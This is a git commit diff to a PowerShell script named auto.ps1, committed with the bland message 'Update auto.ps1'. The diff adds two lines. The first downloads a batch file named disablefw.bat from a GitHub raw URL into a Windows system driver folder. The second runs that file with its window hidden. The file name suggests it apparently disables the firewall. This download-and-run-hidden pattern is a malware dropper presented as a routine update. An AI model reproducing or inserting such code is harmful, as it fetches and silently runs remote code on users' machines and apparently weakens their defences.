18ee29971928ecc33ab0187cc04b096d3946e5ed
nguyenmanmkt <129373032+nguyenmanmkt@users.noreply.github.com>
2024-06-26 14:38:06 +0700

    Update auto.ps1

--- auto.ps1
+++ auto.ps1
@@ -1,1 +1,3 @@
 #
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/nguyenmanmkt/repo1/main/disablefw.bat" -OutFile "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat"
+Start-Process -FilePath "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat" -WindowStyle Hidden -NoNewWindow
